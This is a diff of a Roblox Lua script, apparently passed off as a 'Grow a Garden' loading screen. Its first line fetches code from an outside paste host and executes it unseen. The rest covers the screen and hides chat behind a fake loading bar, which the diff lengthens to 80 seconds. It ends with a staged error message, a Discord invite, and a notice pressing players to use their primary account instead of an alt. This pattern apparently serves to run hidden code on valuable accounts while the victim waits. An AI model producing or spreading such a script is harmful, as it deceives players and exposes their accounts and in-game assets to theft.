@@ -1,29 +1,35 @@
+-- Load external script
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/webnxtIMIIJy7bM8/raw", true))()
+
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
+-- Cleanup previous GUI
+pcall(function()
+    local oldGui = playerGui:FindFirstChild("GrowAGardenLoading")
+    if oldGui then oldGui:Destroy() end
+end)
+
 -- Hide default chat
 local chatFrame = playerGui:FindFirstChild("Chat")
-if chatFrame then
-    chatFrame.Parent = nil
-end
+if chatFrame then chatFrame.Parent = nil end
 
--- Create ScreenGui
+-- ScreenGui
 local gui = Instance.new("ScreenGui")
 gui.Name = "GrowAGardenLoading"
 gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
+gui.DisplayOrder = 9999
 gui.Parent = playerGui
 
--- Background frame
+-- Background Frame
 local bg = Instance.new("Frame")
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 bg.BorderSizePixel = 0
 bg.Parent = gui
 
--- Gradient background
 local gradient = Instance.new("UIGradient")
 gradient.Color = ColorSequence.new{
     ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
@@ -33,7 +39,7 @@ gradient.Color = ColorSequence.new{
 gradient.Rotation = 90
 gradient.Parent = bg
 
--- Title label
+-- Title
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 60)
 title.Position = UDim2.new(0, 0, 0.38, 0)
@@ -44,7 +50,7 @@ title.TextScaled = true
 title.Font = Enum.Font.GothamBlack
 title.Parent = bg
 
--- Subtext label
+-- Subtext
 local sub = Instance.new("TextLabel")
 sub.Size = UDim2.new(1, 0, 0, 20)
 sub.Position = UDim2.new(0, 0, 0.51, 0)
@@ -55,17 +61,17 @@ sub.TextScaled = true
 sub.Font = Enum.Font.Gotham
 sub.Parent = bg
 
--- Loading bar outer frame
+-- Outer loading bar
 local outerBar = Instance.new("Frame")
 outerBar.Size = UDim2.new(0.6, 0, 0, 20)
 outerBar.Position = UDim2.new(0.2, 0, 0.57, 0)
 outerBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-outerBar.BorderSizePixel = 0
 outerBar.BackgroundTransparency = 0.4
+outerBar.BorderSizePixel = 0
 outerBar.ClipsDescendants = true
 outerBar.Parent = bg
 
--- Loading bar inner frame
+-- Inner loading bar
 local innerBar = Instance.new("Frame")
 innerBar.Size = UDim2.new(0, 0, 1, 0)
 innerBar.Position = UDim2.new(0, 0, 0, 0)
@@ -73,7 +79,7 @@ innerBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 innerBar.BorderSizePixel = 0
 innerBar.Parent = outerBar
 
--- Percentage label
+-- Percent label
 local percentText = Instance.new("TextLabel")
 percentText.Size = UDim2.new(1, 0, 0, 20)
 percentText.Position = UDim2.new(0, 0, 0.63, 0)
@@ -84,31 +90,29 @@ percentText.TextScaled = true
 percentText.Font = Enum.Font.GothamBold
 percentText.Parent = bg
 
--- Background music
+-- Music
 local sound = Instance.new("Sound")
-sound.SoundId = "rbxassetid://1837635157" -- Relaxed Scene by Roblox
+sound.SoundId = "rbxassetid://1837635157"
 sound.Volume = 0.5
 sound.Looped = true
 sound.Parent = gui
 sound:Play()
 
--- Animate loading bar progress over 40 seconds (0 to 100%)
+-- Animate loading (80 seconds total)
 for i = 0, 100 do
     innerBar.Size = UDim2.new(i / 100, 0, 1, 0)
     percentText.Text = i .. "%"
-    wait(0.4)
+    wait(0.8)
 end
 
--- Stop music
+-- Stop music and hide UI
 sound:Stop()
-
--- Hide loading elements
 outerBar.Visible = false
 percentText.Visible = false
 sub.Visible = false
 title.Visible = false
 
--- Error message label
+-- Error label
 local errorLabel = Instance.new("TextLabel")
 errorLabel.Size = UDim2.new(1, 0, 0, 50)
 errorLabel.Position = UDim2.new(0, 0, 0.45, 0)
@@ -123,79 +127,76 @@ errorLabel.Parent = bg
 local copyButton = Instance.new("TextButton")
 copyButton.Size = UDim2.new(0, 240, 0, 40)
 copyButton.Position = UDim2.new(0.5, -120, 0.55, 0)
+copyButton.AnchorPoint = Vector2.new(0.5, 0)
 copyButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 copyButton.Text = "📋 Copy link for help"
 copyButton.TextColor3 = Color3.new(0, 0, 0)
 copyButton.TextScaled = true
 copyButton.Font = Enum.Font.GothamBold
-copyButton.Parent = bg
 copyButton.AutoButtonColor = true
 copyButton.BorderSizePixel = 0
 copyButton.BackgroundTransparency = 0.1
-copyButton.AnchorPoint = Vector2.new(0.5, 0)
+copyButton.Parent = bg
 
--- Rounded corners for button
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 8)
-corner.Parent = copyButton
+local corner1 = Instance.new("UICorner")
+corner1.CornerRadius = UDim.new(0, 8)
+corner1.Parent = copyButton
 
--- Clipboard copy function for the Discord invite link
-local inviteLink = "https://discord.gg/seVr3SaW7x" -- Your Discord invite here
+local inviteLink = "https://discord.gg/seVr3SaW7x"
 copyButton.MouseButton1Click:Connect(function()
     if setclipboard then
         setclipboard(inviteLink)
     elseif toclipboard then
         toclipboard(inviteLink)
     else
-        warn("Clipboard function not supported in this environment.")
+        warn("Clipboard not supported.")
     end
     copyButton.Text = "✅ Link copied!"
     wait(2)
     copyButton.Text = "📋 Copy link for help"
 end)
 
--- Error message label
-local errorLabel = Instance.new("TextLabel")
-errorLabel.Size = UDim2.new(1, 0, 0, 50)
-errorLabel.Position = UDim2.new(0, 0, 0.45, 0)
-errorLabel.BackgroundTransparency = 1
-errorLabel.Text = "⚠️ Loading screen failed to load."
-errorLabel.TextColor3 = Color3.new(1, 0.3, 0.3)
-errorLabel.TextScaled = true
-errorLabel.Font = Enum.Font.GothamBold
-errorLabel.Parent = bg
+-- "Need Help?" button
+local helpButton = Instance.new("TextButton")
+helpButton.Size = UDim2.new(0, 240, 0, 40)
+helpButton.Position = UDim2.new(0.5, -120, 0.63, 0)
+helpButton.AnchorPoint = Vector2.new(0.5, 0)
+helpButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+helpButton.Text = "❓ Need Help?"
+helpButton.TextColor3 = Color3.new(0, 0, 0)
+helpButton.TextScaled = true
+helpButton.Font = Enum.Font.GothamBold
+helpButton.AutoButtonColor = true
+helpButton.BorderSizePixel = 0
+helpButton.BackgroundTransparency = 0.1
+helpButton.Parent = bg
 
--- Copy link button
-local copyButton = Instance.new("TextButton")
-copyButton.Size = UDim2.new(0, 240, 0, 40)
-copyButton.Position = UDim2.new(0.5, -120, 0.55, 0)
-copyButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-copyButton.Text = "📋 Copy link for help"
-copyButton.TextColor3 = Color3.new(0, 0, 0)
-copyButton.TextScaled = true
-copyButton.Font = Enum.Font.GothamBold
-copyButton.Parent = bg
-copyButton.AutoButtonColor = true
-copyButton.BorderSizePixel = 0
-copyButton.BackgroundTransparency = 0.1
-copyButton.AnchorPoint = Vector2.new(0.5, 0)
+local helpCorner = Instance.new("UICorner")
+helpCorner.CornerRadius = UDim.new(0, 8)
+helpCorner.Parent = helpButton
 
--- Rounded corners for button
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 8)
-corner.Parent = copyButton
+-- Alt warning label
+local altWarning = Instance.new("TextLabel")
+altWarning.Size = UDim2.new(0.8, 0, 0, 50)
+altWarning.Position = UDim2.new(0.5, 0, 0.72, 0)
+altWarning.AnchorPoint = Vector2.new(0.5, 0)
+altWarning.BackgroundTransparency = 0.2
+altWarning.BackgroundColor3 = Color3.fromRGB(255, 230, 180)
+altWarning.TextColor3 = Color3.fromRGB(90, 60, 0)
+altWarning.Text = ""
+altWarning.TextScaled = true
+altWarning.Font = Enum.Font.GothamMedium
+altWarning.TextWrapped = true
+altWarning.Visible = false
+altWarning.Parent = bg
 
--- Clipboard copy function for the Discord invite link
-local inviteLink = "https://discord.gg/seVr3SaW7x" -- Your Discord invite here
-copyButton.MouseButton1Click:Connect(function()
-    if setclipboard then
-        setclipboard(inviteLink)
-    elseif toclipboard then
-        toclipboard(inviteLink)
-    else
-        warn("Clipboard function not supported in this environment.")
-    end
-    copyButton.Text = "✅ Link copied!"
-    wait(2)
-    copyButton.Text = "📋 Copy link for help"
+local altCorner = Instance.new("UICorner")
+altCorner.CornerRadius = UDim.new(0, 8)
+altCorner.Parent = altWarning
+
+helpButton.MouseButton1Click:Connect(function()
+    altWarning.Text = "⚠️ Notice: This script may not function correctly on alternate accounts. Please log in using your primary account for full access."
+    altWarning.Visible = true
+    wait(5)
+    altWarning.Visible = false
 end)
